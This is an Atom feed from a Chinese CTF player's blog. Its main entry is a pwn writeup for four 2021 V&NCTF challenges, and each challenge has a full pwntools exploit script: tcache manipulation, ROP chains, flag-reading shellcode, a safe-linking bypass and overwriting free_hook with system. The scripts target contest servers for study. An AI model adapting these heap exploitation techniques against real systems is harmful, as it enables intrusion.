<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>velta&#39;s blog</title>
  <icon>https://www.gravatar.com/avatar/2aa3226d819373b0123866587e17d619</icon>
  
  <link href="https://veltavid.github.io/atom.xml" rel="self"/>
  
  <link href="https://veltavid.github.io/"/>
  <updated>2021-08-17T01:28:19.763Z</updated>
  <id>https://veltavid.github.io/</id>
  
  <author>
    <name>velta</name>
    <email>1020217451@qq.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2021V&amp;NCTF-Pwn方向writeup</title>
    <link href="https://veltavid.github.io/2021/08f977f230.html"/>
    <id>https://veltavid.github.io/2021/08f977f230.html</id>
    <published>2021-08-17T01:12:31.000Z</published>
    <updated>2021-08-17T01:28:19.763Z</updated>
    
    <content type="html"><![CDATA[<p>年初打的一场个人赛，拿了Pwn方向第一。</p><h4 id="1-LittleRedFlower"><a href="#1-LittleRedFlower" class="headerlink" title="1.LittleRedFlower"></a>1.LittleRedFlower</h4><p>题目首先给了libc地址。然后根据提示修改tcache_max_bins，想到可以增大tcache_max_bins来延长tcache_perthread_struct到可控制的堆块上，因此任意写一个字节用来将tcache_max_bins增大为0x240。关于tcache_perthread_struct的关键逻辑可以在malloc中找到，如下图所示。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2021/03/14/ZK3zQji9E6rIOm5.png" alt="image-20210314225447429" title="">                </div>                <div class="image-caption">image-20210314225447429</div>            </figure><p>可以看出tcache bin size真正属于tcache_perthread_struct的部分固定为0x80大小，不会随tcache_max_bins改变。但是在根据请求的size寻找时还是用2*(size-0x20)/0x10来定位的，寻找tcache bin指向的堆块时也还是固定先加0x80。</p><p>我选择用的是0x14a0大小的堆块，此时标识其tcache bin size的地址位于一开始分配的0x210大小堆块中，其中size均为0x101，只需要再控制heap_base+0x290+0x840的地方为free_hook-0x110的地址即可。</p><p>然后就是setcontext一把梭了，只是需要找一个gadget来将rdi的相关值赋给rdx并且能够劫持之后的控制流，这个gadget位于0x154b20处。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2021/03/14/OqZct2Rr3Kza1ef.png" alt="image-20210314230310600" title="">                </div>                <div class="image-caption">image-20210314230310600</div>            </figure><p>最终ROP调用mprotect加shellcode读出flag。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2021/03/14/EV4KHOlb72UQR5s.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">sub rsp, 0x800</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor esi, esi</span></span><br><span class="line"><span class="string">mov eax, 2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cmp eax, 0</span></span><br><span class="line"><span class="string">js failed</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edi, eax</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov edx, 0x100</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edx, eax</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov edi, 1</span></span><br><span class="line"><span class="string">mov eax, edi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">jmp exit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">failed:</span></span><br><span class="line"><span class="string">push 0x6c696166</span></span><br><span class="line"><span class="string">mov edi, 1</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov edx, 4</span></span><br><span class="line"><span class="string">mov eax, edi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">exit:</span></span><br><span class="line"><span class="string">xor edi, edi</span></span><br><span class="line"><span class="string">mov eax, 231</span></span><br><span class="line"><span class="string">syscall'''</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh=process('./flower')</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sh=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">27152</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'GIFT: '</span>)</span><br><span class="line">libc_base=int(sh.recvline()[:<span class="number">-1</span>],<span class="number">16</span>)<span class="number">-0x1EB6A0</span></span><br><span class="line">print(hex(libc_base))</span><br><span class="line">free_hook=libc_base+<span class="number">0x1EDB20</span></span><br><span class="line">free_hook2=free_hook&amp;<span class="number">0xfffffffffffff000</span></span><br><span class="line">tmax_bins=libc_base+<span class="number">0x1EA2D0</span></span><br><span class="line">read_addr=libc_base+<span class="number">0x1111F0</span></span><br><span class="line">setcontext=libc_base+<span class="number">0x5803D</span></span><br><span class="line">mprotect=libc_base+<span class="number">0x11BB40</span></span><br><span class="line">gadget_addr=libc_base+<span class="number">0x154B20</span></span><br><span class="line">pop_rdi=libc_base+<span class="number">0x26bb2</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x2709c</span></span><br><span class="line">pop_rdx=libc_base+<span class="number">0x11c3b1</span></span><br><span class="line">write_addr=libc_base+<span class="number">0x111290</span></span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">'anywhere'</span>,p64(tmax_bins+<span class="number">1</span>))</span><br><span class="line">sh.sendafter(<span class="string">'what?'</span>,p8(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">'Offset:'</span>,str(<span class="number">0x830</span>))</span><br><span class="line">sh.sendafter(<span class="string">'Content:'</span>,p64(free_hook<span class="number">-0x110</span>))</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">'size:'</span>,str(<span class="number">0x1450</span>+<span class="number">4</span>*<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rsp = free_hook2</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = free_hook2</span><br><span class="line">frame.rdx = <span class="number">0x2000</span></span><br><span class="line">frame.rip = read_addr</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(free_hook<span class="number">-0x110</span>+<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(setcontext)+str(frame)[<span class="number">0x28</span>:]</span><br><span class="line"><span class="comment">#print(hex(len(payload)))</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sh.sendafter(<span class="string">'&gt;&gt;'</span>,payload.ljust(<span class="number">0x110</span>,<span class="string">'\x00'</span>)+p64(gadget_addr))</span><br><span class="line"></span><br><span class="line">layout=p64(pop_rdi)+p64(free_hook2)+p64(pop_rsi)+p64(<span class="number">0x2000</span>)+p64(pop_rdx)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)+p64(mprotect)+p64(free_hook2+<span class="number">8</span>*<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">sh.send(layout+shellcode)</span><br><span class="line">print(sh.recv())</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 id="2-hh"><a href="#2-hh" class="headerlink" title="2.hh"></a>2.hh</h4><p>vmpwn题，操作码与操作数都固定为4字节。利用9和0xc这两种指令可以栈溢出。</p><p>用9将任意4字节写到v32[++v16+0x1000]中。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2021/03/14/jL6unVwQ3hs91y2.png" alt="image-20210314231425490" title="">                </div>                <div class="image-caption">image-20210314231425490</div>            </figure><p>用0xc将刚写入的数再写到栈上任意位置处。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2021/03/14/ZV4R9EvqbAp8uMI.png" alt="image-20210314231500795" title="">                </div>                <div class="image-caption">image-20210314231500795</div>            </figure><p>v32数组一共有2002个元素，因此下标从2006开始就是返回地址了。</p><p>构造的rop先利用puts函数泄露出libc相关地址再返回main函数。</p><p>第二次rop中先read一个flag字符串到内存中，然后orw读出flag即可。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2021/03/14/vjWik4L1ZDqYG5F.png" alt="image-20210314232543313" title="">                </div>                <div class="image-caption">image-20210314232543313</div>            </figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_8</span><span class="params">(offset,value)</span>:</span></span><br><span class="line"><span class="keyword">return</span> p32(<span class="number">9</span>)+p32(value&amp;<span class="number">0xffffffff</span>)+p32(<span class="number">0xc</span>)+p32(offset)+p32(<span class="number">9</span>)+p32((value&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffffffff</span>)+p32(<span class="number">0xc</span>)+p32(offset+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh=process('./hh')</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sh=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">25073</span>)</span><br><span class="line">pop_rdi=<span class="number">0x4011a3</span></span><br><span class="line">puts_got=<span class="number">0x601FA8</span></span><br><span class="line">puts_plt=<span class="number">0x4006F0</span></span><br><span class="line">main_addr=<span class="number">0x401084</span></span><br><span class="line">flag_addr=<span class="number">0x60Bd00</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code=set_8(<span class="number">1005</span>,<span class="number">0</span>)+set_8(<span class="number">1007</span>,pop_rdi)+set_8(<span class="number">1009</span>,puts_got)+set_8(<span class="number">1011</span>,puts_plt)</span><br><span class="line">code+=set_8(<span class="number">1013</span>,main_addr)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendafter(<span class="string">"code:"</span>,code+p32(<span class="number">0x10</span>))</span><br><span class="line">sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">libc_base=u64(sh.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x6F6A0</span></span><br><span class="line">print(hex(libc_base))</span><br><span class="line">open_addr=libc_base+<span class="number">0xF70F0</span></span><br><span class="line">read_addr=libc_base+<span class="number">0xF7310</span></span><br><span class="line">write_addr=libc_base+<span class="number">0xF7370</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x202f8</span></span><br><span class="line">pop_rdx=libc_base+<span class="number">0x1b92</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code=set_8(<span class="number">1005</span>,<span class="number">0</span>)+set_8(<span class="number">1007</span>,pop_rdi)+set_8(<span class="number">1009</span>,<span class="number">0</span>)+set_8(<span class="number">1011</span>,pop_rsi)+set_8(<span class="number">1013</span>,flag_addr)+set_8(<span class="number">1015</span>,pop_rdx)+set_8(<span class="number">1017</span>,<span class="number">7</span>)+set_8(<span class="number">1019</span>,read_addr)<span class="comment">#read "flag"</span></span><br><span class="line">code+=set_8(<span class="number">1021</span>,pop_rdi)+set_8(<span class="number">1023</span>,flag_addr)+set_8(<span class="number">1025</span>,pop_rsi)+set_8(<span class="number">1027</span>,<span class="number">0</span>)+set_8(<span class="number">1029</span>,pop_rdx)+set_8(<span class="number">1031</span>,<span class="number">0</span>)+set_8(<span class="number">1033</span>,open_addr)</span><br><span class="line">code+=set_8(<span class="number">1035</span>,pop_rdi)+set_8(<span class="number">1037</span>,<span class="number">3</span>)+set_8(<span class="number">1039</span>,pop_rsi)+set_8(<span class="number">1041</span>,flag_addr)+set_8(<span class="number">1043</span>,pop_rdx)+set_8(<span class="number">1045</span>,<span class="number">0x30</span>)+set_8(<span class="number">1047</span>,read_addr)</span><br><span class="line">code+=set_8(<span class="number">1049</span>,pop_rdi)+set_8(<span class="number">1051</span>,<span class="number">1</span>)+set_8(<span class="number">1053</span>,pop_rsi)+set_8(<span class="number">1055</span>,flag_addr)+set_8(<span class="number">1057</span>,pop_rdx)+set_8(<span class="number">1059</span>,<span class="number">0x30</span>)+set_8(<span class="number">1061</span>,write_addr)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendafter(<span class="string">"code:"</span>,code+p32(<span class="number">0x10</span>))</span><br><span class="line">sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'2'</span>)</span><br><span class="line">sh.send(<span class="string">'./flag\x00'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 id="3-White-Give-Flag"><a href="#3-White-Give-Flag" class="headerlink" title="3.White_Give_Flag"></a>3.White_Give_Flag</h4><p>初始化时将flag写入到一个随机大小的堆块中，这个堆块大小在0x310~0x510之间。</p><p>漏洞点如下图所示，其中v4是read的返回值。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2021/03/15/j9vmzrg1lDeBfJc.png" alt="image-20210315090637954" title="">                </div>                <div class="image-caption">image-20210315090637954</div>            </figure><p>只要控制read返回值为0就会造成0x202120处数组的反向溢出，此时该位置是第四个堆块，可以泄露出其中存储的flag。通过shutdown可以使read返回值为0。</p><p>猜测题目环境是存在tcache的，所以先分配3个小于0x200的堆块，然后分配一个在0x310到0x510之间的堆块即可，不过还要保证堆块size字段最低字节大于等于0x20，最后在第4个堆块的前16字节填充垃圾数据。爆破得到flag。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2021/03/15/N8ynRihAkr4D2Xg.png" alt="flag" title="">                </div>                <div class="image-caption">flag</div>            </figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">sh.sendafter(<span class="string">'choice:'</span>,<span class="string">'\n'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'size:\n'</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">sh.sendafter(<span class="string">'choice:'</span>,<span class="string">'aaa\n'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'index:\n'</span>,str(index))</span><br><span class="line">sh.sendafter(<span class="string">'Content:\n'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">sh.sendafter(<span class="string">'choice:'</span>,<span class="string">'a\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh=process('./white')</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">sh=remote(<span class="string">'node4.buuoj.cn'</span>,<span class="number">39123</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x350</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">"b"</span>*<span class="number">16</span>)</span><br><span class="line">sh.shutdown()</span><br><span class="line">sh.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">res=sh.recvline()</span><br><span class="line"><span class="keyword">if</span>(<span class="string">'&#123;'</span> <span class="keyword">in</span> res):</span><br><span class="line">print(res)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><h4 id="4-ff"><a href="#4-ff" class="headerlink" title="4.ff"></a>4.ff</h4><p>题目存在uaf，但在分配了堆块之后就只能对该堆块操作。</p><p>思路是先利用2次edit绕过tcache的double free检测，然后可以分配堆块到tcache_perthread_struct，不过题目环境是glibc 2.32，存在safe linking保护，所以还需要show一次泄露异或后的堆地址。</p><p>分配到tcache_perthread_struct后将0x290大小的tcache bin容量改为7，再free掉进入unsorted bin中。此时可以通过切分tcache_perthread_struct将libc相关地址作为0x50大小的tcache bin指向的堆块。</p><p>随后修改残留的libc地址为stdout的地址，该步需要爆破，从而泄露出libc基址。</p><p>最后继续切分残留在unsorted bin中的tcache_perthread_struct将free_hook分配出来，修改为system拿shell。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2021/03/15/eLEctQP2kusiYzB.png" alt="flag" title="">                </div>                <div class="image-caption">flag</div>            </figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">sh.sendafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'Size:'</span>,str(size))</span><br><span class="line">sh.sendafter(<span class="string">'Content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">sh.sendafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">sh.sendafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(content)</span>:</span></span><br><span class="line">sh.sendafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'5'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'Content:'</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">sh=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26208</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"a"</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>))</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">"aaaa"</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"aaaa"</span>)</span><br><span class="line">free()</span><br><span class="line">edit(p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free()</span><br><span class="line">edit(p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">heap_addr=u64(sh.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">rand_num=(heap_addr&amp;<span class="number">0xffff</span>)^<span class="number">0x2a0</span></span><br><span class="line">guess=rand_num^<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p16(guess))</span><br><span class="line">add(<span class="number">0x60</span>,p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p16(<span class="number">0</span>)*<span class="number">0x27</span>+p16(<span class="number">7</span>))</span><br><span class="line"></span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0x40</span>,p16(<span class="number">0</span>)*<span class="number">3</span>+p16(<span class="number">2</span>)+<span class="string">'\x00'</span>*<span class="number">4</span>+p16(<span class="number">1</span>)+<span class="string">'\x00'</span>*<span class="number">2</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="number">0</span>)</span><br><span class="line">print(hex(heap_addr))</span><br><span class="line">sh.close()</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">add(<span class="number">0x30</span>,p8(<span class="number">0</span>))</span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0</span>)+<span class="string">'\xb0'</span>+<span class="string">'\x96'</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">add(<span class="number">0x40</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'\x7f'</span>,timeout=<span class="number">3</span>)</span><br><span class="line">libc_base=u64(sh.recvuntil(<span class="string">'\x7f'</span>,timeout=<span class="number">3</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x1e39a0</span></span><br><span class="line"><span class="keyword">if</span>(libc_base&lt;<span class="number">0</span>):</span><br><span class="line">libc_base=u64(sh.recvuntil(<span class="string">'\x7e'</span>,timeout=<span class="number">3</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x1e39a0</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">context.log_level=<span class="string">'notset'</span></span><br><span class="line">print(<span class="number">1</span>)</span><br><span class="line">sh.close()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="keyword">if</span>(libc_base&lt;<span class="number">0</span>):</span><br><span class="line">sh.close()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">print(hex(libc_base))</span><br><span class="line">free_hook=libc_base+<span class="number">0x1E6E40</span></span><br><span class="line">system_addr=libc_base+<span class="number">0x503C0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x70</span>,p64(system_addr))</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">free()</span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;年初打的一场个人赛，拿了Pwn方向第一。&lt;/p&gt;
&lt;h4 id=&quot;1-LittleRedFlower&quot;&gt;&lt;a href=&quot;#1-LittleRedFlower&quot; class=&quot;headerlink&quot; title=&quot;1.LittleRedFlower&quot;&gt;&lt;/a&gt;1.Littl</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://veltavid.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>MIT-6.828-JOS-lab6实验笔记</title>
    <link href="https://veltavid.github.io/2021/08bf580101.html"/>
    <id>https://veltavid.github.io/2021/08bf580101.html</id>
    <published>2021-08-17T01:10:20.000Z</published>
    <updated>2021-08-17T08:29:21.865Z</updated>
    
